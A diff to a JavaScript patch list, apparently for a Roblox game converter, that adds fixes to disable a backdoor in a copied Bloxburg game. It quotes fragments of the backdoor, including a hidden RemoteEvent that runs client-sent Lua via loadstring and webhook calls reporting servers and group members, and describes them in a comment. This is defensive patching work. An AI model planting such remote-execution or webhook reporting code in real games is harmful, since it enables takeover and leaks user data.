@@ -428,6 +428,18 @@ const PATCHES = [
     ['if slottag and root[slottag.Name].BrickProperties.EnableMaterial and',
       'if slottag and root and root[slottag.Name] and root[slottag.Name].BrickProperties.EnableMaterial and'],
   ]),
+  // A copy of Welcome to Bloxburg came with a backdoor: DataServer makes a
+  // hidden RemoteEvent ("_DataStore") that runs any Lua a client sends it
+  // (loadstring), and pings someone's Discord webhook whenever a server
+  // starts; Owners reports members of the Bloxburg Development group to
+  // another webhook. All three do nothing now.
+  edits('Bloxburg copy: backdoor and webhook', [
+    ['\tlocal s = loadstring\n\tif typeof(s) == "function" then', '\tlocal s = nil -- (backdoor turned off by the 2017 converter)\n\tif typeof(s) == "function" then'],
+    ['httpService:PostAsync("https://webhook.lewisakura.moe/', '(function() end)("https://webhook.lewisakura.moe/'],
+  ]),
+  edits('Bloxburg copy: group webhook', [
+    ['    if player:IsInGroup(groupId) then\n        local userId = player.UserId', '    if false then -- (webhook turned off by the 2017 converter)\n        local userId = player.UserId'],
+  ]),
   // The shop sends every previewed attachment slot, "" for one toggled off;
   // the server looked each up as attachments[Type][Name] and errored, so no
   // attachment purchase went through. Blank or unknown ones are skipped.
